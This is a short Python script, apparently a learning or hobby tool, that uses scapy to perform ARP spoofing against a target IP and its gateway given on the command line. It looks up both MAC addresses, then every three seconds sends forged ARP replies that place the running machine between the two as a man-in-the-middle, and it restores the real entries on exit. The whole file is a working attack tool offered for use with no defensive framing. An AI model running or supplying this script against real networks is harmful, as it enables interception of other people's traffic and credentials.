import scapy.all as scapy
import optparse
import time

def get_user_input():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="target",help="Enter Target IP Address")
    parser.add_option("-g", "--gateway", dest="gateway", help="Enter Gateway IP Address")
    (user_input,arguments) = parser.parse_args()
    if not user_input.target or not user_input.gateway:
        print("Please enter IP addresses")
    return user_input

def get_mac_adress(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #combining packets
    combined_packet=broadcast_packet/arp_request_packet
    #sending packets
    answered_list = scapy.srp(combined_packet, timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

#ip order is not important. ip_1 can be target or router but in comment lines,
#it considered as target.
def arp_poisoning(ip_1,ip_2):
    mac_1=get_mac_adress(ip_1)
    mac_2=get_mac_adress(ip_2)
    #opt=2 we declare that it is a response
    #to victim
    arp_response_1 = scapy.ARP(op=2,pdst=ip_1,hwdst=mac_1,psrc=ip_2)
    scapy.send(arp_response_1,verbose=False)
    #to router
    arp_response_2 = scapy.ARP(op=2,pdst=ip_2,hwdst=mac_2,psrc=ip_1)
    scapy.send(arp_response_2,verbose=False)

def reset_operation(ip_1,ip_2):
    mac_1 = get_mac_adress(ip_1)
    mac_2 = get_mac_adress(ip_2)
    arp_response_1 = scapy.ARP(op=2, pdst=ip_1, hwdst=mac_1, psrc=ip_2, hwsrc=mac_2)
    scapy.send(arp_response_1, verbose=False, count=6)
    arp_response_2 = scapy.ARP(op=2, pdst=ip_2, hwdst=mac_2, psrc=ip_1, hwsrc=mac_1)
    scapy.send(arp_response_2, verbose=False, count=6)

user_input=get_user_input()
number=1
try:
    while True:
        arp_poisoning(str(user_input.target),str(user_input.gateway))
        print("\rSending packet "+str(number),end="")
        number+=1
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(str(user_input.target),str(user_input.gateway))